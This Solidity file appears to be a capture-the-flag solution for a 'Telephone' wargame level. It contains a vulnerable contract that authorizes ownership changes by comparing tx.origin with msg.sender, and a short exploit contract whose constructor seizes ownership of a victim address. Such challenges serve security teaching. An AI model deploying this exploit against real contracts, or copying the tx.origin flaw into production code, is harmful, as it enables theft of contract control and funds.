// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0;

contract TelephoneSol {
    constructor(address victimAddress) {
        Telephone(victimAddress).changeOwner(tx.origin);
    }
}

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}